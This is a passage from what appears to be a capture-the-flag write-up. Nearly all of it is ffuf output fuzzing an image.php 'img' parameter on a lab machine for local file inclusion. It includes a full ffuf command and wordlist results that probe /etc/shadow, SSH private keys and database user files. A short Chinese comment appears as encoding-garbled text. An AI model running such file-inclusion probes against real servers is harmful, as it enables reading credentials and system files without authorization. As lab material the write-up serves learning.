1]\n/etc/vhcs2/proftpd/proftpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/php/php.ini        [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/wu-ftpd/ftpaccess  [Status: 200, Size: 0, Words: 1, Lines: 1]\n/proc/version           [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/network/interfaces [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/bootptab           [Status: 200, Size: 0, Words: 1, Lines: 1]\n/root/anaconda-ks.cfg   [Status: 200, Size: 0, Words: 1, Lines: 1]\n/opt/xampp/etc/php.ini  [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/etc/pure-ftpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/ssh/ssh_host_key.pub [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/lib/php/php.ini    [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/apache/conf/modsec.conf [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/apache/log   [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/apache/logs  [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/apache/logs/access_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/apache/logs/access.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/httpd/logs/error.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/apache/error_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/cpanel/logs  [Status: 200, Size: 0, Words: 1, Lines: 1]\n/logs/security_log      [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/cpanel/logs/error_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/motd               [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/redhat-release     [Status: 200, Size: 0, Words: 1, Lines: 1]\n/proc/swaps             [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/etc/httpd/logs/access_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/hosts.deny         [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/at.deny            [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/etc/httpd/logs/error_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/etc/php.ini  [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/etc/pureftpd.pdb [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/php4/lib/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/php5/httpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/lib/php.ini        [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/php5/lib/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/cpanel/logs/license_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/proftp.conf        [Status: 200, Size: 0, Words: 1, Lines: 1]\n/opt/lampp/etc/httpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/php/lib/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/pureftpd/etc/pureftpd.pdn [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/cpanel/logs/access_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/www/logs/httpd_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/Zend/etc/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/lib/php.ini  [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/wu-ftpd/ftphosts   [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/adm/log/xferlog    [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/apache/error.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/apache2/config.inc [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/php4/cgi/php.ini   [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/apache/logs/error_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/cpanel/cpanel.config [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/local/www/conf/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/php5/httpd.conf.php [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/cpanel/logs/stats_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/sbin/pure-config.pl [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/apache2/access_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/snmpd.conf         [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/apache2/access.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/apache/access.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/apache/conf/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1]\n/logs/security_debug_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/lib/mysql/my.cnf   [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/ssh/ssh_host_key   [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/apache-ssl/access.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/pureftpd/etc/pure-ftpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/inittab            [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/exports            [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/hosts.allow        [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/cups/error.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/pureftpd/sbin/pure-config.pl [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/daemon.log     [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/debug          [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/dmesg          [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/apache/audit_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/dpkg.log       [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/wu-ftpd/ftpusers   [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/exim_mainlog   [Status: 200, Size: 0, Words: 1, Lines: 1]\n/proc/mounts            [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/apache2/error_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/exim_paniclog  [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/apache/error.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/exim_rejectlog [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/exim/rejectlog [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/faillog        [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/httpd/access_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/httpd/conf/httpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/httpd/error.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/proc/meminfo           [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/htmp               [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/apache-ssl/error.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/httpsd/ssl.access_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/httpsd/ssl_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/php4/httpd.conf.php [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/kern.log       [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/lighttpd/error.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/lighttpd/lighttpd.error.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/mail.info      [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/exim/mainlog   [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/ftp-proxy/ftp-proxy.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/messages       [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/mtab               [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/lighttpd/access.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/mail.warn      [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/httpd/error_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/cpanel/logs/login_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/ftp-proxy      [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/mysqlderror.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/php4/apache2/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/pureftpd.log   [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/pure-ftpd/pure-ftpd.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/maillog        [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/mysql.log      [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/message        [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/vsftpd.log     [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/wtmp           [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/ftplog         [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/xferlog        [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/lastlog        [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/yum.log        [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/spool/cron/crontabs/root [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/apache/access_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/lib/mysql/mysql/user.MYD [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/www/log/access_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/lighttpd/lighttpd.access.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n~/.bash_profile         [Status: 200, Size: 0, Words: 1, Lines: 1]\n~/.bashrc               [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/secure         [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/webmin/miniserv.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/proftpd/proftpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/mail.log       [Status: 200, Size: 0, Words: 1, Lines: 1]\n~/.mysql_history        [Status: 200, Size: 0, Words: 1, Lines: 1]\n/logs/pure-ftpd.log     [Status: 200, Size: 0, Words: 1, Lines: 1]\n~/.profile              [Status: 200, Size: 0, Words: 1, Lines: 1]\n~/.ssh/authorized_keys  [Status: 200, Size: 0, Words: 1, Lines: 1]\n~/.atfp_history         [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/apache2/error.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n~/.nano_history         [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/exim.paniclog  [Status: 200, Size: 0, Words: 1, Lines: 1]\n~/.login                [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/mysql.log          [Status: 200, Size: 0, Words: 1, Lines: 1]\n~/.ssh/id_rsa           [Status: 200, Size: 0, Words: 1, Lines: 1]\n~/.ssh/id_rsa.pub       [Status: 200, Size: 0, Words: 1, Lines: 1]\n~/.php_history          [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/printcap           [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/mysql/mysql-slow.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n~/.ssh/identity.pub     [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/ssh/sshd_config    [Status: 200, Size: 0, Words: 1, Lines: 1]\n~/.viminfo              [Status: 200, Size: 0, Words: 1, Lines: 1]\n~/.wm_style             [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/proftpd        [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/httpd/access.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n~/.xinitrc              [Status: 200, Size: 0, Words: 1, Lines: 1]\n~/.xsession             [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/apache/error_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/php/httpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1]\n~/.logout               [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/www/logs/error.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/pure-ftpd/putreftpd.pdb [Status: 200, Size: 0, Words: 1, Lines: 1]\n~/.ssh/id_dsa           [Status: 200, Size: 0, Words: 1, Lines: 1]\n~/.ssh/id_dsa.pub       [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/php5/apache2/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1]\n~/.bash_logout          [Status: 200, Size: 0, Words: 1, Lines: 1]\n/proc/self/net/arp      [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/www/logs/access.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/www/logs/access_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n~/.ssh/identity         [Status: 200, Size: 0, Words: 1, Lines: 1]\n/etc/php4/apache2/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/etc/pure-ftpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/php4/httpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1]\n~/.bash_history         [Status: 200, Size: 0, Words: 1, Lines: 1]\n~/.Xdefaults            [Status: 200, Size: 0, Words: 1, Lines: 1]\n/usr/local/php/httpd.conf.ini [Status: 200, Size: 0, Words: 1, Lines: 1]\n~/.gtkrc                [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/www/log/error_log  [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/apache/logs/access_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n~/.Xresources           [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/auth.log       [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/boot           [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/chttp.log      [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/mysql/mysql-bin.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/log/mysql/mysql.log [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/run/utmp           [Status: 200, Size: 0, Words: 1, Lines: 1]\n/var/www/logs/error_log [Status: 200, Size: 0, Words: 1, Lines: 1]\n:: Progress: [257/257] :: Job [1/1] :: 19 req/sec :: Duration: [0:00:23] :: Errors: 0 ::\n```\nè¿™è¾¹å¯ä»¥fuzzå‡ºæ¥ï¼Œä½†å†…å®¹éƒ½æ˜¯0ï¼Œè¯æ˜å‚æ•°ä¸å¯¹ï¼Œå°è¯•ä¸€ä¸‹å…¶ä»–å‚æ•°\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ffuf -u \"http://10.10.11.135/image.php?img=FUZZ\" -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -fs 0\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.11.135/image.php?img=FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n :: Filter           : Response size: 0\n________________________________________________\n\n/etc/aliases            [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/at.allow           [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/hosts.deny         [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/httpd/access.conf  [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/httpd/conf/httpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/cups/cupsd.conf    [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/ftpchroot          [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/chrootUsers        [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/groups             [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/lilo.conf          [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/httpd/httpd.conf   [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/httpd/logs/access.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/shadow             [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/httpd/logs/access_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/httpd/php.ini      [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/inittab            [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/hosts.allow        [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/inetd.conf         [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/httpd/srm.conf     [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/motd               [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/logrotate.d/proftpd [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/logrotate.d/vsftpd.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/httpd/logs/error.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/apache2/apache2.conf [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/ftpaccess          [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/modules.conf       [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/mtab               [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/php5/apache2/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/bashrc             [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/anacrontab         [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/php/apache2/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/php/php4/php.ini   [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/passwd             [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/issue              [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/chttp.conf         [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/exports            [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/pure-ftpd/pure-ftpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/network/interfaces [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/php4/apache2/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/cron.deny          [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/my.conf            [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/fstab              [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/grub.conf          [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/php4/cgi/php.ini   [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/pureftpd.passwd    [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/pure-ftpd/putreftpd.pdb [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/pureftpd.pdb       [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/redhat-release     [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/ssh/ssh_config     [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/snmpd.conf         [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/ssh/ssh_host_dsa_key.pub [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/passwd             [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/pure-ftpd/pure-ftpd.pdb [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/my.cnf             [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/termcap            [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/proftpd/proftpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/vhcs2/proftpd/proftpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/php4.4/fcgi/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/php4/apache/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/php5/apache/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/printcap           [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/php4/apache2/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/httpd/logs/error_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/cron.allow         [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/apache2/httpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/vsftpd/vsftpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/wu-ftpd/ftpaccess  [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/wu-ftpd/ftphosts   [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/ssh/sshd_config    [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/wu-ftpd/ftpusers   [Status: 200, Size: 25, Words: 3, Lines: 1]\n/logs/security_log      [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/samba/smb.conf     [Status: 200, Size: 25, Words: 3, Lines: 1]\n/proc/filesystems       [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/ssh/ssh_host_dsa_key [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/php/apache/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1]\n/proc/stat              [Status: 200, Size: 25, Words: 3, Lines: 1]\n/proc/swaps             [Status: 200, Size: 25, Words: 3, Lines: 1]\n/root/anaconda-ks.cfg   [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/etc/pure-ftpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/ftphosts           [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/npasswd            [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/lib/php/php.ini    [Status: 200, Size: 25, Words: 3, Lines: 1]\n/logs/security_debug_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/php/cgi/php.ini    [Status: 200, Size: 25, Words: 3, Lines: 1]\n/proc/modules           [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/ssh/ssh_host_key.pub [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/php/php.ini        [Status: 200, Size: 25, Words: 3, Lines: 1]\n/proc/version           [Status: 200, Size: 25, Words: 3, Lines: 1]\n/proc/ioports           [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/hosts              [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/apache/error_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/cpanel/logs  [Status: 200, Size: 25, Words: 3, Lines: 1]\n/proc/meminfo           [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/cpanel/logs/error_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/apache/conf/modsec.conf [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/cpanel/logs/license_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/cpanel/logs/login_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/apache/log   [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/apache/logs/access_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/proc/mounts            [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/mysql/my.cnf       [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/etc/php.ini  [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/etc/pure-ftpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/proftp.conf        [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/profile            [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/php4/httpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/php4/lib/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/vsftpd.conf        [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/php5/httpd.conf.php [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/pure-ftpd.conf     [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/cpanel/logs/stats_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/proc/interrupts        [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/lib/php.ini        [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/sysconfig/network  [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/pureftpd/etc/pure-ftpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/pureftpd/etc/pureftpd.pdn [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/vsftpd.chroot_list [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/apache/audit_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/Zend/etc/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/sbin/pure-config.pl [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/adm/log/xferlog    [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/apache/logs/access_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/opt/lampp/etc/httpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/lib/mysql/my.cnf   [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/php/httpd.conf.ini [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/pureftpd/sbin/pure-config.pl [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/apache/logs  [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/syslog.conf        [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/apache2/access.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/lib/php.ini  [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/apache2/error.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/apache/access_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/logs/pure-ftpd.log     [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/apache-ssl/error.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/opt/xampp/etc/php.ini  [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/apache/conf/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/php5/lib/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/etc/pureftpd.pdb [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/cpanel/cpanel.config [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/apache/access.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/lsb-release        [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/logrotate.d/ftp    [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/local/www/conf/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/htmp               [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/networks           [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/www/logs/httpd_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/cups/error.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/apache/error.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/lib/mysql/mysql/user.MYD [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/daemon.log     [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/debug          [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/dpkg.log       [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/exim/mainlog   [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/exim.paniclog  [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/apache/error.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/apache/logs/error_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/cpanel/logs/access_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/at.deny            [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/motd               [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/auth.log       [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/httpd/error.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/kern.log       [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/lighttpd/error.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/lighttpd/lighttpd.access.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/httpd/access.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/httpd/access_log [Status: 200, Size: 25, 